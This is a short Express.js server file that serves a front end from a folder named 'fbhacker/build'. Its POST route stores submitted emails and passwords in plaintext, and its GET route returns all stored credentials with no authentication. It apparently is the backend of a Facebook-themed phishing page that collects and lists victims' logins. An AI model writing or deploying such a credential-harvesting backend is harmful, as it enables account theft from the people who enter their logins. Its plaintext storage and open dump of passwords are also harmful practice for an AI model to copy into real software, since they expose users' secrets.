const express = require("express");
const app = express();
const cors = require("cors");
const pool = require("./db");
//middleware

app.use(cors());
app.use(express.json())

const path = require("path");
const PORT = process.env.PORT || 5000;




if (process.env.NODE_ENV === "production") {
  //server static content
  //npm run build
  app.use(express.static(path.join(__dirname, "fbhacker/build")));
}

console.log(__dirname);
console.log(path.join(__dirname, "fbhacker/build"));

app.post("/get",  async (req, res) => {
  try {
      const email = req.body.email,
          password = req.body.password;
    const user = await pool.query(
    "INSERT INTO users (user_email, user_password) VALUES ($1, $2) RETURNING *",
      [email, password] 
    ); 
    
  
    
    res.json(user.rows);
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server error");
  }
});


app.get("/get",  async (req, res) => {
  try {
     
    const user = await pool.query(
    "SELECT * FROM users "
   
    ); 
    
  
    
    res.json(user.rows);
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server error");
  }
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "fbhacker/build/index.html"));
});


app.listen(PORT, () => {
    console.log(`Server is starting on port ${PORT}`);
  });